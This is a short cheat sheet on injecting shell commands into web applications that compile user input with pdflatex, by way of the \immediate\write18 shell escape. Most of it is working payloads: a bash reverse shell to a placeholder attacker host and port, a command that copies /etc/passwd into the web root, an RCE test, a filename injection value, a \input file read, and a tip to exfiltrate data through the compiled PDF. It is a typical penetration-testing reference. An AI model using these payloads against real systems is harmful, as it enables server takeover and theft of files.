# pdflatex Command Injection

When a web application passes user-controlled input to `pdflatex` (or similar LaTeX compilers) without sanitization, shell commands can be injected via LaTeX's `\immediate\write18` directive (shell escape).

## Payload

```latex
\immediate\write18{<COMMAND>}
```

## Reverse Shell via Injected LaTeX

```latex
\immediate\write18{bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'}
```

## Read File

```latex
\immediate\write18{cat /etc/passwd > /var/www/html/out.txt}
```

## Test RCE

```latex
\immediate\write18{id > /tmp/rce.txt}
```

## Notes
- Requires `--shell-escape` flag passed to pdflatex (sometimes default in web apps)
- Without shell-escape, `\write18` is disabled and silently ignored
- Alternate injection point: filename passed to the compiler (`; id #`)
- Also check `\input{/etc/passwd}` for file read (no shell-escape required)
- Application may return compiled PDF — embed data exfiltration in PDF content
- Different from LaTeX LFI (`\input`) — this achieves OS command execution
